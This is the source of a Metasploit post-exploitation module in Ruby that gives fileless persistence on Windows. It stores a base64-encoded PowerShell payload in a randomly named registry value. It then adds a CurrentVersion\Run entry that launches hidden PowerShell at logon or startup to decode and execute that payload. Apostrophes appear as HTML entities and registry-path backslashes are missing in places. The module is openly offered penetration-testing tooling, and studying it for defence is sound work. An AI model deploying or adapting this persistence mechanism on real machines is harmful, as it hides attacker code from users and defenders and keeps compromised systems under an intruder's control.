# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;
require &#039;msf/core/post/file&#039;

class Metasploit4 < Msf::Exploit::Local
Rank = ExcellentRanking

include Msf::Exploit::Powershell
include Msf::Post::Windows::Registry
include Msf::Post::File

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Windows Registry Only Persistence&#039;,
&#039;Description&#039; => %q{
This module will install a payload that is executed during boot.
It will be executed either at user logon or system startup via the registry
value in "CurrentVersionRun" (depending on privilege and selected method).
The payload will be installed completely in registry.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;Donny Maasland <donny.maasland[at]fox-it.com>&#039;,
],
&#039;Platform&#039; => [ &#039;win&#039; ],
&#039;Targets&#039; =>
[
[ &#039;Automatic&#039;, { } ]
],
&#039;DefaultTarget&#039; => 0,
&#039;DisclosureDate&#039; => "Jul 1 2015",
&#039;DefaultOptions&#039; =>
{
&#039;DisablePayloadHandler&#039; => &#039;true&#039;
}
))

register_options([
OptEnum.new(&#039;STARTUP&#039;,
[true, &#039;Startup type for the persistent payload.&#039;, &#039;USER&#039;, [&#039;USER&#039;,&#039;SYSTEM&#039;]]),
OptString.new(&#039;BLOB_REG_KEY&#039;,
[false, &#039;The registry key to use for storing the payload blob. (Default: random)&#039; ]),
OptString.new(&#039;BLOB_REG_NAME&#039;,
[false, &#039;The name to use for storing the payload blob. (Default: random)&#039; ]),
OptString.new(&#039;RUN_NAME&#039;,
[false, &#039;The name to use for the &#039;Run&#039; key. (Default: random)&#039; ]),
OptBool.new(&#039;CREATE_RC&#039;,
[false, &#039;Create a resource file for cleanup&#039;, true]),
], self.class)
end

def generate_payload_blob
opts = {
use_single_quotes: true,
encode_final_payload: true,
}
blob = cmd_psh_payload(payload.encoded,payload_instance.arch.first, opts).split(&#039; &#039;)[-1]
return blob
end

def generate_cmd(root_path, blob_key_name, blob_key_reg)
cmd = "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item &#039;#{root_path}:#{blob_key_name}&#039;).GetValue(&#039;#{blob_key_reg}&#039;))))""
return cmd
end

def generate_blob_reg
blob_reg_key = datastore[&#039;BLOB_REG_KEY&#039;] || "Software#{Rex::Text.rand_text_alphanumeric(8)}"
blob_reg_name = datastore[&#039;BLOB_REG_NAME&#039;] || Rex::Text.rand_text_alphanumeric(8)
return blob_reg_key, blob_reg_name
end

def generate_cmd_reg
cmd_reg = datastore[&#039;RUN_NAME&#039;] || Rex::Text.rand_text_alphanumeric(8)
return cmd_reg
end

def install_blob(root_path, blob, blob_reg_key, blob_reg_name)
blob_reg_key = "#{root_path}#{blob_reg_key}"
new_key = false
if not registry_enumkeys(blob_reg_key)
unless registry_createkey(blob_reg_key)
fail_with(Failure::Unknown,"Failed to create key #{blob_reg_key}")
end
print_good("Created registry key #{blob_reg_key}")
new_key = true
end

unless registry_setvaldata(blob_reg_key, blob_reg_name, blob, "REG_SZ")
fail_with(Failure::Unknown,&#039;Failed to open the registry key for writing&#039;)
end
print_good("Installed payload blob to #{blob_reg_key}#{blob_reg_name}")
return new_key
end

def install_cmd(cmd, cmd_reg, root_path)
unless registry_setvaldata("#{root_path}SoftwareMicrosoftWindowsCurrentVersionRun", cmd_reg, cmd, &#039;REG_EXPAND_SZ&#039;)
fail_with(Failure::Unknown,&#039;Could not install run key&#039;)
end
print_good("Installed run key #{root_path}SoftwareMicrosoftWindowsCurrentVersionRun#{cmd_reg}")
end

def get_root_path
if datastore[&#039;STARTUP&#039;] == &#039;USER&#039;
root_path = &#039;HKCU&#039;
else
root_path = &#039;HKLM&#039;
end
return root_path
end

def log_file(log_path = nil) # Thanks Meatballs for this
# Get hostname
host = session.session_host

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
if log_path
logs = ::File.join(log_path, &#039;logs&#039;, &#039;persistence&#039;,
Rex::FileUtils.clean_path(host + filenameinfo))
else
logs = ::File.join(Msf::Config.log_directory, &#039;persistence&#039;,
Rex::FileUtils.clean_path(host + filenameinfo))
end

# Create the log directory
::FileUtils.mkdir_p(logs)

# logfile name
logfile = ::File.join(logs, Rex::FileUtils.clean_path(host + filenameinfo) + &#039;.rc&#039;)
logfile
end

def create_cleanup(root_path, blob_reg_key, blob_reg_name, cmd_reg, new_key) # Thanks Meatballs for this
clean_rc = log_file()
@clean_up_rc = ""
@clean_up_rc << "reg deleteval -k &#039;#{root_path}#{blob_reg_key}&#039; -v &#039;#{blob_reg_name}&#039;n"
if new_key
@clean_up_rc << "reg deletekey -k &#039;#{root_path}#{blob_reg_key}&#039;n"
end
@clean_up_rc << "reg deleteval -k &#039;#{root_path}SoftwareMicrosoftWindowsCurrentVersionRun&#039; -v &#039;#{cmd_reg}&#039;n"
file_local_write(clean_rc, @clean_up_rc)

report_note(:host => session.session_host,
type: &#039;host.persistance.cleanup&#039;,
data: {
local_id: session.sid,
stype: session.type,
desc: session.info,
platform: session.platform,
via_payload: session.via_payload,
via_exploit: session.via_exploit,
created_at: Time.now.utc,
commands: @clean_up_rc
}
)
end

def check
unless registry_enumkeys("HKLMSOFTWAREMicrosoft").include?("PowerShell")
return Msf::Exploit::CheckCode::Safe
end
return Msf::Exploit::CheckCode::Vulnerable
end

def exploit
unless registry_enumkeys("HKLMSOFTWAREMicrosoft").include?("PowerShell")
print_warning(&#039;Warning: PowerShell does not seem to be available, persistence might fail&#039;)
end

print_status(&#039;Generating payload blob..&#039;)
blob = generate_payload_blob
print_good("Generated payload, #{blob.length} bytes")

root_path = get_root_path
print_status("Root path is #{root_path}")

blob_reg_key, blob_reg_name = generate_blob_reg
cmd = generate_cmd(root_path, blob_reg_key, blob_reg_name)
cmd_reg = generate_cmd_reg

print_status(&#039;Installing payload blob..&#039;)
new_key = install_blob(root_path, blob, blob_reg_key, blob_reg_name)

print_status(&#039;Installing run key&#039;)
install_cmd(cmd, cmd_reg, root_path)

if datastore[&#039;CREATE_RC&#039;]
create_cleanup(root_path, blob_reg_key, blob_reg_name, cmd_reg, new_key)
end
end
end

